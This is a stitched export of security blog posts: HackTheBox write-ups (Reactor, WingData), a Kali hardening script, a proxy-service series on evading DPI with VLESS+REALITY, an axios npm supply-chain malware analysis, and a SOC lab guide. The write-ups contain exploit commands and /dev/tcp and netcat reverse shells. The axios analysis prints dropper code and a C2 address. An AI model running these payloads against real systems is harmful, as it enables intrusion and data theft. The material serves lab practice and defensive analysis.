title: Reactor
excerpt: HackTheBox Reactor (Linux, Easy) — unauthenticated RCE via React2Shell (CVE-2025-55182) on Next.js, MD5 hash cracking for password reuse, and privilege escalation through an exposed Node.js debugger port.
text: Reactor OS : Linux Difficulty : Easy IP : 10.129.95.38 Started : 2026-09-14 Rooted : 2026-09-14 Status : Completed Summary Reactor is an easy Linux box. There's a Next.js app on port 3000 that's vulnerable to React2Shell (CVE-2025-55182), so you get code execution as the node user without logging in. The app ships a SQLite database full of MD5 password hashes. The engineer hash cracks to reactor1 , and the same password works for the system account. For root, there's a Node.js process running as root with the debugger port open on localhost, so you attach to it and tell it to make /bin/bash SUID. Recon Full port scan: sudo nmap -Pn -p- -sC -sV -T4 -oN nmap-scan.txt 10.129.95.38 Two ports: SSH on 22 and a web app on 3000. The headers give the stack away: curl -sI http://10.129.95.38:3000/ HTTP/1.1 200 OK X-Powered-By: Next.js x-nextjs-cache: HIT Wappalyzer showed the exact version, Next.js 15.0.3, which is in range for CVE-2025-55182. Foothold: React2Shell (CVE-2025-55182) Next.js server actions deserialize request data without checking it properly, so one crafted POST gets you RCE as whatever user runs the app. No auth needed. I used the Chocapikk PoC to confirm it first: python3 -m venv venv && source venv/bin/activate pip install -r requirements.txt python3 exploit.py -u http://10.129.95.38:3000/ -c "ls" app next.config.js node modules package.json reactor.db Then a reverse shell: python3 exploit.py -u http://10.129.95.38:3000/ -r -l 10.10.16.201 -p 4445 -P nc-mkfifo That drops a shell as node . Upgrade it so it's actually usable: python3 -c 'import pty; pty.spawn("/bin/bash")' export TERM=xterm Ctrl+Z stty raw -echo; fg stty rows 54 columns 209 Getting to engineer The reactor.db file is the interesting bit: sqlite3 reactor.db sqlite .tables sensor logs users sqlite select from users; 1 admin a203b22191d744a4e70ada5c101b17b8 administrator admin@reactor.htb 2 engineer 39d97110eafe2a9a68639812cd271e8e operator engineer@reactor.htb Plain MD5, no salt. rockyou cracks the engineer one straight away: hashcat -m 0 39d97110eafe2a9a68639812cd271e8e /usr/share/wordlists/rockyou.txt 39d97110eafe2a9a68639812cd271e8e:reactor1 Password is reactor1 , and it's reused for the system user: su engineer reactor1 User flag engineer@reactor: $ cat user.txt Root: exposed Node debugger Checking what root is running: ps aux grep root root 1289 ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js The --inspect flag opens the V8 debugger. Anything that can reach that port can run JavaScript inside the process, and this process runs as root. It's bound to localhost, but I'm already on the box, so that doesn't help them. Pull websocat over, find the debugger's websocket URL, then send it one command: wget http://10.10.16.201/websocat && chmod +x websocat curl -s http://127.0.0.1:9229/json returns webSocketDebuggerUrl with a UUID echo '{"id":1,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require( "child process ").execSync( "chmod +s /bin/bash ").toString()"}}' ./websocat ws://127.0.0.1:9229/876bb34f-73ac-488e-b5d4-60401c458902 Check bash is SUID now, then drop into a root shell: ls -la /bin/bash -rwsr-sr-x 1 root root ... /bin/bash bash -p Root flag bash-5.2 cat /root/root.txt Credentials User Secret Source ------ -------- -------- engineer reactor1 (cracked MD5) reactor.db admin MD5 hash, didn't crack reactor.db Attack chain Next.js 15.0.3 on port 3000 │ ▼ React2Shell (CVE-2025-55182) → RCE as node, no auth │ ▼ reactor.db → MD5 hashes → crack engineer to reactor1 │ ▼ su engineer (password reuse) → user flag │ ▼ Node --inspect debugger on 127.0.0.1:9229, running as root │ ▼ Runtime.evaluate over websocket → chmod +s /bin/bash │ ▼ bash -p → root flag References CVE-2025-55182 — Next.js Server Actions Deserialization RCE (React2Shell) Node.js Debugger — --inspect Security Warning

title: WingData
excerpt: HackTheBox WingData (Linux, Medium) — Wing FTP CVE-2025-47812 unauthenticated RCE, static-salt SHA-256 cracking, and a Python tarfile PATH_MAX symlink bypass for root.
text: WingData OS : Linux Difficulty : Medium IP : 10.129.244.106 Started : 2026-05-09 Rooted : 2026-05-09 Status : Completed Summary WingData is a Linux box running Apache with a Wing FTP Server v7.4.3 behind a virtual host. The FTP web interface is vulnerable to CVE-2025-47812 (unauthenticated RCE via NULL byte Lua injection), which gives a shell as wingftp . From there, user credentials are extracted from Wing FTP's XML config files and cracked using the application's static salt ( WingFTP ), yielding SSH access as wacky . Privilege escalation exploits a sudo-permitted Python backup restore script that uses tarfile.extractall(filter="data") — vulnerable to CVE-2025-4138/CVE-2025-4517 (PATH MAX symlink bypass) — to write an SSH public key to /root/.ssh/authorized keys . Reconnaissance Port Scan sudo nmap -Pn -p- -sC -sV -T4 10.129.244.106 Port Service Version Notes --- --- --- --- 22 SSH OpenSSH 9.2p1 Debian 80 HTTP Apache 2.4.66 (Debian) Redirects to http://wingdata.htb/ Only two ports open. The HTTP redirect to wingdata.htb tells us we need to set /etc/hosts before doing any web enumeration. echo "10.129.244.106 wingdata.htb" sudo tee -a /etc/hosts Virtual Host Discovery The main site at wingdata.htb is a static corporate page. A "Client Portal" link in the navigation points to ftp.wingdata.htb . Confirmed via vhost fuzzing with ffuf — ftp returned a 404 (distinct from the default 301), indicating a configured vhost: ffuf -u http://wingdata.htb -H "Host: FUZZ.wingdata.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 301 echo "10.129.244.106 ftp.wingdata.htb" sudo tee -a /etc/hosts Service Identification Browsing to http://ftp.wingdata.htb/login.html reveals Wing FTP Server v7.4.3 (visible in the page footer). This version is vulnerable to CVE-2025-47812 — unauthenticated RCE. Foothold — CVE-2025-47812 (Wing FTP Unauthenticated RCE) Type : Remote, Unauthenticated · CVE : CVE-2025-47812 · Service : Wing FTP Server 7.4.3 How It Works Wing FTP Server versions ≤ 7.4.3 have a discrepancy between two internal functions: 1. c CheckUser() uses strlen() on the username, which truncates at a NULL byte ( %00 ). Authentication passes for the portion before the NULL — in this case, anonymous . 2. Session file creation uses the full unsanitised username, including everything after the NULL byte. 3. Since session files are stored as Lua scripts, injecting Lua code after the NULL byte writes executable code into the session file. 4. When /dir.html is accessed with the resulting session cookie, SessionModule.load() calls loadfile() → f() on the session file, executing the injected Lua code as the wingftp user. Exploitation Using the public PoC (Exploit-DB 52347): python3 CVE-2025-47812.py -u http://ftp.wingdata.htb/ -c "whoami" -v Output confirms RCE as wingftp . Directory listing of the Wing FTP installation: python3 CVE-2025-47812.py -u http://ftp.wingdata.htb/ -c "ls" -v Data License.txt Log lua pid-wftpserver.pid README session session admin version.txt webadmin webclient wftpconsole wftp default ssh.key wftp default ssl.crt wftp default ssl.key wftpserver Reverse Shell Listener nc -lvnp 9001 Via exploit python3 CVE-2025-47812.py -u http://ftp.wingdata.htb/ -c "/bin/bash -i & /dev/tcp/ /9001 0 &1" -v Shell upgrade: python3 -c 'import pty;pty.spawn("/bin/bash")' export TERM=xterm Lateral Movement — wingftp → wacky Credential Discovery As wingftp , the Wing FTP data directory is readable: ls /opt/wftpserver/Data/1/users/ anonymous.xml john.xml maria.xml steve.xml wacky.xml Cross-referencing with system users: cat /etc/passwd grep sh$ wacky:x:1001:1001::/home/wacky:/bin/bash wacky is both a Wing FTP user and a system user with a home directory and bash shell. Hash Extraction From wacky.xml : wacky 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca 64-character hex string → SHA-256. Finding the Salt Initial attempt to crack as plain SHA-256 ( hashcat -m 1400 ) failed against rockyou.txt. The application's domain settings reveal the salt configuration: cat /opt/wftpserver/Data/1/settings.xml 1 WingFTP Wing FTP uses a static, hardcoded salt ( WingFTP ) for all users. The hashing algorithm is SHA256(password + salt) . Cracking Format the hash file as hash:salt and use hashcat mode 1410 ( sha256($pass.$salt) ): printf '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP' hash.txt hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt --force Or with John the Ripper (uses $ separator): printf '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca$WingFTP' john hash.txt john --format=dynamic 62 --wordlist=/usr/share/wordlists/rockyou.txt john hash.txt Cracked : ! 7Blushing^ Bride5 SSH Access ssh wacky@wingdata.htb Password: ! 7Blushing^ Bride5 User Flag User flag: 7923263667011b58aac75a0e7d45e6d3 Privilege Escalation — CVE-2025-4138 (tarfile PATH MAX Bypass) Sudo Permissions wacky@wingdata: $ sudo -l User wacky may run the following commands on wingdata: (root) NOPASSWD: /usr/local/bin/python3 /opt/backup clients/restore backup clients.py Analysing the Script cat /opt/backup clients/restore backup clients.py Key observations: Reads tar files from /opt/backup clients/backups/ Filename must match backup .tar Extracts using tarfile.extractall(path=staging dir, filter="data") The filter="data" is the vulnerable line Python Version Check python3 --version Python 3.12.3 Python 3.12.3 is vulnerable to CVE-2025-4138/CVE-2025-4517 — a PATH MAX overflow in os.path.realpath() that bypasses the filter="data" safety check. When the resolved symlink path exceeds 4096 bytes (Linux PATH MAX), realpath() silently stops resolving and falls back to string manipulation, allowing symlinks to escape the extraction directory. Exploitation Step 1 — Generate SSH keypair on the box: ssh-keygen -t ed25519 -f /tmp/key -N "" Step 2 — Create malicious tar that writes our public key to root's authorized keys: python3 /tmp/exp.py -o /tmp/evil.tar -t

title: Kali Linux Hardening
excerpt: An annotated MIT-licensed Bash script that hardens a fresh Kali install — firewall, fail2ban, rkhunter, ClamAV, and a Lynis audit.
text: A small Bash script that brings a fresh Kali install to a sane defensive baseline: applies updates, installs common defensive tooling, locks down inbound traffic, then runs three independent scans before printing a hardening report. The original was published by Gerard King under the MIT License. This version is a cleanup with each tool documented inline, safer error handling ( set -euo pipefail , root check up front), and a few practical fixes — e.g. stopping clamav-freshclam before running freshclam so the daemon's DB lock does not fail the update. Download automate cybersecurity kali.sh Run it as root on a host you own: chmod +x automate cybersecurity kali.sh sudo ./automate cybersecurity kali.sh What it installs Tool Purpose --- --- ufw Friendly front-end for nftables/iptables. Enforces a default-deny inbound policy. fail2ban Watches service logs (e.g. SSH) and dynamically bans IPs that fail authentication repeatedly. rkhunter Rootkit Hunter. Scans for known rootkit signatures, suspicious permissions, hidden files, and altered system binaries. chkrootkit Independent second-opinion rootkit scanner. Different signature set and detection heuristics. clamav Open-source antivirus engine. Bundled with freshclam (signature updater) and clamscan (on-demand scanner). lynis Host-hardening auditor. Produces a prioritised report with a numeric "hardening index". What it changes UFW set to deny inbound by default, allow outbound, permit OpenSSH. fail2ban enabled on boot. Updates and runs rkhunter , clamscan against /home , and lynis audit system --quick . Logs land in the usual places: /var/log/rkhunter.log , /var/log/lynis.log , /var/log/lynis-report.dat . The script !/usr/bin/env bash automate cybersecurity kali.sh — Defensive setup script for Kali Linux Hardens a Kali Linux host: applies updates, installs common defensive tools, enables a host firewall and intrusion-prevention, and runs malware/rootkit scanners and a system auditor. Intended for the operator's own machine. Original author: Gerard King — https://www.gerardking.dev License: MIT (preserved below) Cleaned and annotated by onecybit — https://onecybit.github.io Usage: sudo ./automate cybersecurity kali.sh set -euo pipefail Every step below needs root (apt, systemctl, ufw, freshclam, etc.). if [[ $EUID -ne 0 ]]; then echo "Run as root: sudo $0" &2 exit 1 fi log() { printf ' n[+] %s n' "$ "; } ── 1. System update ──────────────────────────────────────────────────────── Refreshes the apt package index and applies pending security/feature upgrades, so every tool installed below is at its latest patched version. update system() { log "Updating package index and upgrading installed packages…" apt-get update DEBIAN FRONTEND=noninteractive apt-get upgrade -y } ── 2. Install defensive tooling ──────────────────────────────────────────── ufw Uncomplicated Firewall — a friendly front-end for nftables/iptables. fail2ban Log-watcher / IP-banner. Tails service logs and dynamically inserts firewall rules to block hosts that show repeated failed authentication attempts. rkhunter Rootkit Hunter — scans for known rootkit signatures, suspicious file permissions, hidden files, and altered system binaries. chkrootkit Independent second-opinion rootkit scanner. Pairs with rkhunter. clamav Open-source antivirus engine. Ships with freshclam (signature updater) and clamscan (on-demand scanner). lynis Host-hardening auditor. Produces a prioritised report with a numeric "hardening index". install security tools() { log "Installing defensive tooling…" apt-get install -y ufw fail2ban rkhunter chkrootkit clamav lynis } ── 3. Firewall ───────────────────────────────────────────────────────────── Default-deny inbound is the standard hardening posture. SSH is allowed so the operator does not lock themselves out of a remote box — drop the ufw allow OpenSSH line if the host is purely local. configure ufw() { log "Configuring UFW (deny in, allow out, permit SSH)…" ufw default deny incoming ufw default allow outgoing ufw allow OpenSSH ufw --force enable } ── 4. fail2ban ───────────────────────────────────────────────────────────── Default jail bans an IP after 5 failed SSH auth attempts for 10 minutes. Tune /etc/fail2ban/jail.local to change thresholds or add jails. setup fail2ban() { log "Enabling fail2ban service…" systemctl enable --now fail2ban } ── 5. Rootkit Hunter ─────────────────────────────────────────────────────── --update refreshes the signature database (kept non-fatal). --check --sk runs every test and skips the interactive prompts so the script can run unattended. Output: /var/log/rkhunter.log run rkhunter() { log "Running rkhunter…" rkhunter --update true rkhunter --check --sk } ── 6. ClamAV ─────────────────────────────────────────────────────────────── freshclam cannot run while the clamav-freshclam daemon holds the DB lock, so we briefly stop it. clamscan -r --bell -i /home recursively scans the user's home directory and prints only infected files. run clamav() { log "Updating ClamAV signatures…" systemctl stop clamav-freshclam 2 /dev/null true freshclam true systemctl start clamav-freshclam 2 /dev/null true log "Scanning /home for malware…" clamscan -r --bell -i /home } ── 7. Lynis audit ────────────────────────────────────────────────────────── Writes /var/log/lynis.log and /var/log/lynis-report.dat with concrete remediation suggestions and a hardening index. --quick skips pauses. run lynis() { log "Running lynis system audit…" lynis audit system --quick } main() { log "Starting cybersecurity setup on Kali Linux…" update system install security tools configure ufw setup fail2ban run rkhunter run clamav run lynis log "Cybersecurity setup on Kali Linux completed." } main "$@" Notes Drop the ufw allow OpenSSH line if the host is purely local — it is there so remote operators do not lock themselves out. Tune /etc/fail2ban/jail.local for different ban thresholds, or to add jails for other services. Read the Lynis report — it ranks suggestions; address

title: Ftarg — Ch.3: The Management Layer — Bot, Database, Automation
excerpt: Telegram bot, encrypted storage, Marzban API integration, and the automation that keeps the whole thing running.
text: Ftarg — Ch.3: The Management Layer — Bot, Database, Automation Protocol is solid (Ch.1). Stack is running (Ch.2). Now the part that sits on top — user management and automation. Built a Telegram bot from scratch to handle everything user-facing. Handles the full lifecycle: request, approval, link delivery, cleanup. Why a custom bot Marzban has its own Telegram bot, but it's admin-only. No user-facing flow. I needed: user sends a request → admin approves or rejects → user gets their link. Plus encrypted storage, auto-cleanup, preset rejection reasons. None of that exists in Marzban's bot. So now there are two bots. Marzban's for panel management. Custom one for users. User flow User: /start └── bot explains the service User: /request └── bot creates entry, stored in encrypted DB └── admin gets notified Admin: /pending └── sees list of pending requests └── approve or reject Approved: └── bot creates user in Marzban via API └── user gets notified └── /mylink returns VLESS subscription link Rejected: └── admin picks preset reason └── user gets notified └── request cleaned from DB User side: /status , /mylink , /guide . Admin side: /stats , /health , /check , /relink , /delete , /sync , /purge , /logs . What the bot does Encrypted storage. Request data lives in an encrypted file. Fernet (AES-256-GCM). Marzban API integration. Bot talks to Marzban via REST — creates users, fetches links, syncs state. Retry logic. Every API call wrapped with retries and exponential backoff. Docker hiccups happen, users never notice. Auto-cleanup. Stale requests cleared on a schedule. Bot DB stays in sync with Marzban panel. Auto-delete messages. Old bot replies get removed on the next interaction. Chat stays clean. Monitoring + backup. Health check and DB backup run on cron. Single-node scope — nothing fancy. The whole stack +------------------------------------------------------------------+ Ch.1 — PROTOCOL VLESS + REALITY + TLS 1.3 impersonation Ch.2 — INFRASTRUCTURE Marzban + XRay in Docker (host network) WARP outbound via XRay native WireGuard Ch.3 — MANAGEMENT LAYER Telegram bot, encrypted DB, Marzban API Auto-cleanup, monitoring, backups +------------------------------------------------------------------+ Protocol handles transport. Infrastructure handles the runtime. Management layer handles users. That's the whole build.

title: Ftarg — Ch.2: Architecture — Marzban and XRay
excerpt: The actual stack behind the proxy service — Marzban, XRay, Docker with host networking, and solving the asymmetric routing problem with XRay's native WireGuard outbound.
text: Ftarg — Ch.2: Architecture — Marzban and XRay Ftarg — Ch.2: Architecture — Marzban, XRay, and the Routing Problem Previous chapter covered why most protocols get caught by DPI and how REALITY avoids that. This one is about the actual stack — what's running and why. Marzban Marzban is an open-source management panel for XRay. Handles user creation, subscription links, traffic tracking, expiry. Has a built-in Telegram admin bot. Why Marzban over 3x-ui or others: Cleaner API Docker-native Better multi-node support in its architecture You configure XRay directly It's not the proxy. It's the control panel. XRay does the actual work. Docker setup Marzban runs in Docker with host network mode. Improtant part is the REALITY needs direct access to port 443 for the TLS handshake. Docker's default bridge networking adds a NAT layer in between — the handshake gets mangled, connections behave unpredictably or just drop. Host network mode = container uses the host's network stack directly. No NAT, no bridge. Port 443 works as expected. Single compose file, XRay config mounted as a volume. The routing problem This was the biggest headache of the whole build. What I needed The proxy server accepts connections on port 443 (VLESS+REALITY). Traffic comes in, gets decrypted, needs to go out to the internet. Simple. But I didn't want outbound traffic going from my server's real IP. Reasons: privacy, IP reputation, separation between the proxy identity and the underlying host. So I needed an outbound tunnel. What I tried first ProtonVPN. WireGuard-based, seemed solid. Set it up as a system-level VPN on the host. wg-quick up , routing table updated, traffic going through the tunnel. Looked good. Then port 443 stopped accepting connections. I spent a while trying to make it work — policy routing, ip rules, different configs. Couldn't get inbound and outbound to coexist. At that point I moved on and started looking at other approaches. Why system-level VPN breaks inbound Later I understood the actual problem. When you bring up a system-level VPN, it takes over the default route. Every packet leaving the host goes through the tunnel — including responses to incoming connections. So, what happens: 1. Client sends SYN to your real IP on port 443 2. Your server accepts, sends SYN-ACK 3. But SYN-ACK goes out through the VPN tunnel 4. Client gets a response from a completely different IP 5. Connection dropped Classic asymmetric routing. The incoming path and outgoing path don't match. BROKEN (system-level VPN): Client --[SYN to real IP:443]-- Server response routed --- VPN tunnel --- different IP Client Server (direct, normal routing) +-- XRay +-- proxy traffic -- WARP tunnel -- internet +-- response back to client (correct source IP) Clean separation. Inbound = direct. Outbound = tunneled. No routing conflicts. The solution isn't obvious unless you know XRay can do WireGuard natively. Application-level routing instead of system-level routing — that's the key. Current stack +------------------------------------------+ Host (Fedora) +------------------------------------+ Docker (host network mode) Marzban panel └── XRay core ├── Inbound: │ VLESS+REALITY (443) └── Outbound: WireGuard (WARP) +------------------------------------+ DuckDNS (dynamic DNS) firewalld (443 only) +------------------------------------------+ Running on residential fiber with dynamic IP. DuckDNS handles DNS updates. Not ideal for production but fine for dev — residential IPs are less likely to be on blocklists, which is actually an advantage during testing. Protocol layer handled. Stack is running. Next problem: making sure the operational side doesn't leak what the protocol layer protects. Next: Ftarg — Ch.3: Threat Modeling and Security Hardening

title: Axios Supply Chain Attack: npm Account Hijack Deploys Cross-Platform RAT
excerpt: Breakdown of the March 2026 axios npm supply chain attack — how a hijacked maintainer account pushed backdoored versions delivering a cross-platform RAT to millions of developers.
text: What Happened On March 31, 2026, a coordinated supply chain attack hit axios — one of the most widely used npm packages with 100 million weekly downloads, present in roughly 80% of cloud environments. An attacker compromised the npm account of lead maintainer jasonsaayman , changed the account email to ifstap@proton.me , and manually published two backdoored versions: axios@1.14.1 — tagged latest (v1 branch) axios@0.30.4 — tagged legacy (v0 branch) Both versions injected a phantom dependency: plain-crypto-js@4.2.1 . This package was never imported by axios code — its sole purpose was to execute a postinstall hook that drops a cross-platform Remote Access Trojan. The malicious versions were live for approximately 3 hours before npm security pulled them. In that window, Huntress observed at least 135 endpoints contacting the attacker's C2 infrastructure, with the first infection landing just 89 seconds after publication. Timeline Timestamp (UTC) Event ------------------ ------- 2026-03-30 05:57 Clean plain-crypto-js@4.2.0 published — establishes registry history 2026-03-30 23:59 Malicious plain-crypto-js@4.2.1 published with postinstall dropper 2026-03-31 00:05 Socket's automated scanner flags it as malware ( 6 min) 2026-03-31 00:21 axios@1.14.1 published, tagged latest — attack goes live 2026-03-31 00:23 First infection observed — macOS endpoint, 89 seconds post-publish 2026-03-31 00:58 First Windows infection via wt.exe 2026-03-31 01:00 axios@0.30.4 published, tagged legacy 2026-03-31 03:29 plain-crypto-js removed by npm security 2026-03-31 03:30 Compromised axios versions yanked How the Account Was Compromised The attacker obtained credentials for the jasonsaayman npm account — exact method remains undetermined. The critical detail: even though the v1.x branch had OIDC Trusted Publishing configured through GitHub Actions, the CI/CD workflow still passed NPM TOKEN as an environment variable alongside OIDC credentials. When both are present, npm uses the token . The attacker bypassed the entire trusted publishing workflow by simply using the stolen long-lived token to publish directly via npm CLI. This is a fundamental design flaw. OIDC is supposed to eliminate persistent credentials, but co-existing tokens nullify the entire protection model. The Dropper: setup.js The postinstall hook runs node setup.js — a 4,209-byte file using two layers of obfuscation: Layer 1: Reversed Base64 The encoded payload string is reversed, underscores replaced with = padding, then Base64-decoded. Layer 2: XOR Cipher Each decoded character is XORed with a digit derived from key OrDeR 7077 (index selected by 7 i i % 10 ) and the constant 333 : const trans 1 = function(x, r) { const E = r.split("").map(Number); return x.split("").map((x, r) = { const S = x.charCodeAt(0), a = E[7 r r % 10]; return String.fromCharCode(S ^ a ^ 333); }).join(""); }; The stq[] array contains 18 obfuscated strings — module names ( child process , os , fs ), the C2 endpoint, shell commands, and file paths. After deobfuscation, the script: 1. Detects the OS via os.platform() 2. Contacts C2 at http://sfrclak[.]com:8000/6202033 3. Posts platform identifier: product0 (macOS), product1 (Windows), product2 (Linux) 4. Downloads and executes the platform-specific RAT 5. Self-destructs — deletes setup.js , removes its own package.json , and renames a clean package.md backup to package.json fs.unlink( filename, (x = {})); // delete setup.js fs.unlink("package.json", (x = {})); // remove malicious package.json fs.rename("package.md", "package.json", (x = {})); // restore clean version After cleanup, node modules/plain-crypto-js looks identical to the clean 4.2.0 — no trace of the dropper remains on disk. RAT Behavior by Platform macOS The dropper downloads a Mach-O binary to /Library/Caches/com.apple.act.mond — mimicking Apple's daemon naming convention to blend in. It's fetched via curl , made executable, and launched through an AppleScript wrapper. Reverse engineering by Joe Desimone revealed the full RAT capabilities: Victim ID : Generates 16-character unique identifier Fingerprinting : Hostname, username, macOS version, boot/install times, CPU architecture ( mac arm / mac x64 ), running processes Beacon : HTTP POST every 60 seconds using a fake IE8/Windows XP User-Agent string Commands : peinject — Receives Base64-encoded binary, performs ad-hoc code signing via codesign --force --deep --sign to bypass Gatekeeper runscript — Executes shell commands via /bin/sh or AppleScript via osascript rundir — Enumerates /Applications , /Library , /Application Support kill — Terminates processes Windows The dropper locates PowerShell and copies it to %PROGRAMDATA% wt.exe — disguising it as Windows Terminal to evade EDR detection. A VBScript launcher ( %TEMP% 6202033.vbs ) executes a PowerShell script ( %TEMP% 6202033.ps1 ) with execution policy bypass, running hidden. Linux A Python script is downloaded to /tmp/ld.py and launched as an orphaned background process via nohup python3 , surviving shell termination. Pre-staging and Anti-Forensics The operational sophistication here is notable: 1. Clean decoy version — plain-crypto-js@4.2.0 published 18 hours before the malicious 4.2.1 , establishing brief registry history 2. Dual branch targeting — Both v1.x ( latest ) and v0.x ( legacy ) tags poisoned, maximizing coverage across pinned and unpinned consumers 3. Self-deleting dropper — Restores clean package state post-execution 4. Naming mimicry — macOS RAT uses Apple daemon naming; Windows RAT masquerades as Windows Terminal 5. Fake User-Agent — Beacon uses mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0) — an IE8/XP string to blend with legacy enterprise traffic Indicators of Compromise Malicious Packages Package SHA-1 --------- ------- axios@1.14.1 2553649f2322049666871cea80a5d0d6adc700ca axios@0.30.4 d6f3f62fd3b9f5432f5782b62d8cfd5247d5ee71 plain-crypto-js@4.2.1 07d889e2dadce6f3910dcbc253317d28ca61c766 RAT Artifacts (SHA-256) Platform

title: Proxy service. Ch.1: Why Most Proxy Protocols Fail Against Modern DPI
excerpt: How DPI fingerprints VPN traffic at the protocol level, and why TLS 1.3 impersonation is the only transport-level approach that survives modern inspection.
text: Proxy service. Ch.1: Why Most Proxy Protocols Fail Against Modern DPI Most VPN and proxy protocols weren't designed to be invisible. They were designed to be fast, secure, or easy to deploy. But when you put them in front of a modern DPI system, everything falls apart. Why is that? How DPI identifies proxy traffic DPI doesn't need to decrypt anything. It works on metadata — packet sizes, timing, handshake structure, header bytes, entropy patterns. Three main techniques: 1. Protocol fingerprinting. Every protocol has a handshake signature. OpenVPN starts with a specific opcode byte ( 0x38 for P CONTROL HARD RESET CLIENT V2 ). WireGuard opens with a fixed 4-byte message type. These are static, predictable, and trivial to match with a regex on the first packet. And DPI sees this VPN service. 2. Entropy analysis. Encrypted traffic has near-uniform byte distribution. Normal HTTPS also has high entropy, but it's wrapped in TLS with recognizable structure — certificates, extensions, ALPN negotiation. A raw encrypted stream without that framing (like Shadowsocks or early VMess) stands out. It's not HTTP, not TLS, not any known protocol — just high-entropy noise. That alone is a signal. 3. Statistical fingerprinting. Packet size distributions and timing patterns vary between protocols. A WireGuard keepalive is always 32 bytes. Shadowsocks handshake packets cluster around specific sizes depending on cipher choice. DPI systems build statistical models and flag traffic that matches known distributions, even if the content is opaque. Protocol breakdown Protocol How it gets caught How hard to block --- --- --- OpenVPN Static opcode first packet Trivial WireGuard Fixed handshake + 32-byte keepalives Trivial Shadowsocks Entropy analysis, no protocol framing Moderate VMess Packet length patterns, timing Moderate VLESS + TLS Depends on TLS implementation Hard VLESS + REALITY TLS 1.3 impersonation, real cert Very hard OpenVPN and WireGuard are the easiest to block. Their handshakes are essentially self-announcing — a single signature rule catches them. Some DPI systems don't even bother with deep analysis; they just match the first few bytes. Shadowsocks improved on this significantly. No fixed header, no recognizable handshake. But it still produces a stream of high-entropy data with no protocol framing. Modern DPI detects this by exclusion — if it's not TLS, not HTTP, not SSH, not DNS, and it's high-entropy on a common port, flag it. The "looks like nothing" approach worked for years, but statistical detection caught up. VMess has similar issues. The protocol adds its own framing, and the packet length distribution is distinguishable from real HTTPS under analysis. Later versions improved, but the fundamental problem remains: it's a custom protocol pretending to be nothing, in an environment where "nothing" is suspicious. The TLS impersonation approach The insight that changed everything: don't invent a new protocol. Instead, make proxy traffic look exactly like regular HTTPS to a real, legitimate website. This is what VLESS + REALITY does. A normal TLS 1.3 handshake: Client Server --- ClientHello (SNI: example.com) -- The SNI (Server Name Indication) field tells the server which domain the client wants. DPI systems read this to categorize traffic. If the SNI says example.com and the TLS handshake looks legitimate, DPI has no reason to interfere — it looks like someone browsing a normal website. REALITY takes this further. Instead of using a self-signed certificate (which DPI can detect by checking against known CAs), it proxies the actual TLS handshake to the impersonated server. The certificate that comes back is real. The handshake is real. To any observer — including DPI — this looks identical to a genuine TLS 1.3 connection to that domain. The proxy server only takes over after the handshake completes. The client authenticates using a pre-shared key embedded in the handshake, and the connection switches to the proxy tunnel. If someone without the key connects — including DPI systems doing active probing — they get served the real website. There's nothing to detect. DPI perspective: Client -- [TLS 1.3 ClientHello, SNI: legitimate-site.com] -- Server [Encrypted application data] -- Verdict: Normal HTTPS. Pass. Actual flow: Client -- proxy server -- authenticates via pre-shared key -- tunnel established -- traffic routed through proxy Why SNI target selection matters Not every domain works as an impersonation target. The SNI target needs to: Support TLS 1.3 (mandatory — REALITY only works with 1.3) Support HTTP/2 — needed for the handshake to look complete Be plausible for the client's geography and usage patterns Be a high-traffic domain (so connections to it don't stand out) Not use certificate pinning or other mechanisms that break the proxy handshake Some popular targets fail silently. One well-known example — a major tech company's domain supports TLS 1.3 but its H2 implementation breaks the handshake flow. No error on the server side, but the connection drops. Took a while to figure that out. The ideal target is a large, boring, high-traffic site that's accessed constantly from everywhere. Search engines, CDN providers, major web platforms. The kind of domain where one more TLS connection is invisible in the noise. What this means for architecture If REALITY solves the detection problem at the protocol level, the remaining engineering challenges are everything around it — routing, scaling, user management, operational security, and making sure nothing else in the stack leaks metadata that undoes the transport-level privacy. That's what the rest of this series covers. Next: Proxy service — Ch.2: Architecture — Marzban, XRay, and the Routing Problem

title: SOC Lab — Ch.2: Sysmon, Suricata & Wazuh Integration
excerpt: Expanding the SOC lab with Sysmon deep-logging on Windows and Suricata IDS on the server. Configuring Wazuh to ingest both host-based and network telemetry.
text: We're going to set up Wazuh to properly monitor security events on our Windows endpoint. While we perform penetration testing on the Windows machine using Kali Linux, Wazuh will collect and forward the relevant logs. Enable Windows Event Log Monitoring By default, the Wazuh agent collects logs from key sources. You can customize this on the Windows machine in: C: Program Files (x86) ossec-agent ossec.conf Ensure you have these entries: Security eventchannel System eventchannel Application eventchannel Microsoft-Windows-PowerShell/Operational eventchannel Restart Wazuh agent (on Windows): net stop wazuh net start wazuh Installing Sysmon Sysmon = detailed logging for process creation, registry, network connections. Steps: Download sysmon Use SwiftOnSecurity's config: https://github.com/SwiftOnSecurity/sysmon-config As the author mentioned, we'll install Sysmon in the C: directory. While we don't have a system-wide setup, it's still good practice to do so. Design notes This configuration expects software to be installed system-wide and NOT in the C: Users folder. Various pieces of software install themselves in User directories, which are subject to extra monitoring. Where possible, you should install the system-wide version of these pieces of software, like Chrome. See the configuration file for more instructions. Install: sysmon.exe -accepteula -i sysmonconfig.xml In Wazuh agent config, add: Microsoft-Windows-Sysmon/Operational eventchannel Restart Wazuh agent. Installing Suricata To monitor Windows endpoint traffic from your Ubuntu Wazuh server, we'll install and integrate a Network IDS like Suricata on the Ubuntu server, and use port mirroring (SPAN) or a tapped interface to observe Windows traffic. Installing Suricata (recommended over Snort for Wazuh integration), and integrating it with Wazuh. Fully open-source and modern IDS/IPS/NSM engine JSON output is easily parsed by Wazuh Multi-threaded (better performance) Native Wazuh module support Install Suricata on Ubuntu (Wazuh Server) 1. Add Suricata PPA and install sudo add-apt-repository ppa:oisf/suricata-stable sudo apt update sudo apt install suricata -y 2. Enable eve.json logging for Wazuh Edit /etc/suricata/suricata.yaml Find the outputs: section and ensure eve-log is enabled: outputs: eve-log: enabled: yes filetype: regular filename: /var/log/suricata/eve.json types: alert: metadata: yes tags: yes Here is my suricata.yaml config file: Suricata Your HOME NET should be set to: vars: address-groups: HOME NET: "[192.168.1.100]" 